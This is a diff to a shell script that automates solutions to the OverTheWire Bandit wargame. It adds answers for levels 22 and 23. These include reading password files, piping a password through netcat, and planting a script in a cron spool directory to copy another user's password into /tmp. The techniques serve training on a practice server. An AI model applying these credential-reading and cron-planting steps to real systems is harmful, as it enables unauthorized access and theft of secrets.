@@ -59,11 +59,23 @@ lvl19(){ ./bandit20-do cat /etc/bandit_pass/bandit20; exit; }
 lvl20()
 {
    cat /etc/bandit_pass/bandit20 | nc -l -p 20000 & 
-   echo $(./suconnect 20000 1>/dev/null); exit;
+   echo $(./suconnect 20000 1>/dev/null)
+   exit;
 }
 lvl21() { cat $(cat /usr/bin/cronjob_bandit22.sh | awk '/>/{print $NF}');exit; }
+lvl22() { cat /tmp/$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1);exit; }
+lvl23()
+{
+   cd /var/spool/bandit24/foo
+   echo '#!/bin/bash' >> script.sh
+   echo 'cat /etc/bandit_pass/bandit24 > /tmp/huh' >> script.sh
+   chmod a+x script.sh
+   sleep 65
+   cat /tmp/huh
+   exit
+}
 
-for v in {0..21};
+for v in {0..23};
 do
   if [ $v -eq 13 ];
   then
@@ -72,5 +84,5 @@ do
  	 pass=$(sshpass -p $pass ssh  -p 2220 bandit$v@bandit.labs.overthewire.org "$(declare -f lvl$v);lvl$v")
    fi
    echo "$v -> $((v+1)) :  $pass"
-   sleep 1
+   sleep $((RANDOM % 2 + 1))
 done
